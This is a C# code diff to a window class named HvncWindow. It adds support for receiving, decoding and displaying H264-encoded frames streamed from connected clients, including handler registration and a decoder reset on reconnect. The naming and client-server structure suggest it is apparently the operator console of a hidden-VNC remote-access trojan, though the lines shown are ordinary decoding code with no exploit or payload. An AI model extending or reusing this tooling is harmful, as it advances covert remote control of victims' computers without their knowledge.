@@ -29,6 +29,7 @@ public partial class HvncWindow : ThemedWindow
     private bool _ctrlDown;
     private volatile bool _renderBusy;
     private WriteableBitmap? _wb;
+    private H264Decoder? _h264Dec;
 
     // Canvas dimensions reported by last frame
     private int _remoteW = 1280;
@@ -68,6 +69,8 @@ public partial class HvncWindow : ThemedWindow
 
         _server.RegisterHandler(clientId, PacketType.HvncFrame,
             pkt => OnHvncFrame(clientId, pkt.Data));
+        _server.RegisterHandler(clientId, PacketType.HvncH264Frame,
+            pkt => OnHvncH264Frame(clientId, pkt.Data));
         _server.RegisterHandler(clientId, PacketType.HvncProgress,
             pkt => OnHvncProgress(pkt.Data));
         _server.ClientDisconnected += OnClientDisconnected;
@@ -80,7 +83,9 @@ public partial class HvncWindow : ThemedWindow
             _reconnectTimer?.Stop();
             _clipTimer?.Stop(); _clipTimer = null;
             _server.UnregisterHandler(_clientId, PacketType.HvncFrame);
+            _server.UnregisterHandler(_clientId, PacketType.HvncH264Frame);
             _server.UnregisterHandler(_clientId, PacketType.HvncProgress);
+            _h264Dec?.Dispose(); _h264Dec = null;
             _server.ClientDisconnected -= OnClientDisconnected;
             _server.ClientConnected -= OnClientConnected;
             if (_streaming) SendStop();
@@ -290,6 +295,38 @@ public partial class HvncWindow : ThemedWindow
         catch { SendAck(); }
     }
 
+    private void OnHvncH264Frame(string clientId, string json)
+    {
+        if (_closed || clientId != _clientId) return;
+        try
+        {
+            var frame = Newtonsoft.Json.JsonConvert.DeserializeObject<H264FrameData>(json);
+            if (frame == null || string.IsNullOrEmpty(frame.D)) { SendAck(); return; }
+
+            _remoteW = frame.W > 0 ? frame.W : _remoteW;
+            _remoteH = frame.H > 0 ? frame.H : _remoteH;
+
+            if (_renderBusy) { SendAck(); return; }
+            _renderBusy = true;
+
+            var h264Bytes = Convert.FromBase64String(frame.D);
+            int fw = frame.W, fh = frame.H;
+
+            Task.Run(() =>
+            {
+                try
+                {
+                    if (_h264Dec == null) _h264Dec = H264Decoder.Create();
+                    var pixels = _h264Dec?.Decode(h264Bytes, fw, fh);
+                    if (pixels == null || _closed) { _renderBusy = false; SendAck(); return; }
+                    Dispatcher.BeginInvoke(() => ShowFrame(pixels, fw, fh, fw * 4));
+                }
+                catch { _renderBusy = false; SendAck(); }
+            });
+        }
+        catch { _renderBusy = false; SendAck(); }
+    }
+
     private void OnHvncProgress(string json)
     {
         if (_closed) return;
@@ -470,11 +507,16 @@ public partial class HvncWindow : ThemedWindow
 
             // Re-register per-client packet handlers on the new client ID
             _server.UnregisterHandler(oldId, PacketType.HvncFrame);
+            _server.UnregisterHandler(oldId, PacketType.HvncH264Frame);
             _server.UnregisterHandler(oldId, PacketType.HvncProgress);
             _server.RegisterHandler(_clientId, PacketType.HvncFrame,
                 pkt => OnHvncFrame(_clientId, pkt.Data));
+            _server.RegisterHandler(_clientId, PacketType.HvncH264Frame,
+                pkt => OnHvncH264Frame(_clientId, pkt.Data));
             _server.RegisterHandler(_clientId, PacketType.HvncProgress,
                 pkt => OnHvncProgress(pkt.Data));
+            // Reset H264 decoder on reconnect so it re-initializes with the new stream's SPS/PPS
+            _h264Dec?.Dispose(); _h264Dec = null;
 
             // Hide overlays, cancel timer
             _reconnectTimer?.Stop();
